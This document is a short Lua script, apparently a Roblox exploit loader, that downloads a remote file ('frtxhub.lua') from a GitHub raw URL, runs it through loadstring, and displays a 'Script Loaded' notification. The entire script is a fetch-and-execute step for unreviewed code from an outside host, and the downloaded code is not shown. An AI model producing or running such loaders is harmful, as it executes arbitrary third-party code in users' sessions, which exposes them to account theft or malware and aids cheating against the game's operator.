task.spawn(function()
  local success, result = pcall(game.HttpGetAsync, game, "https://raw.githubusercontent.com/LorisHost/lzosiexw/refs/heads/main/frtxhub.lua")
  if success then
    local func, err = loadstring(result)
    if func then
      func()
      game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Script Loaded",
        Text = "Script loaded successfully!",
        Duration = 5
      })
    else
      warn("Script compilation error:", err) -- Include the error message
    end
  else
    warn("Failed to fetch script:", result) -- Include the error message
  end
end)
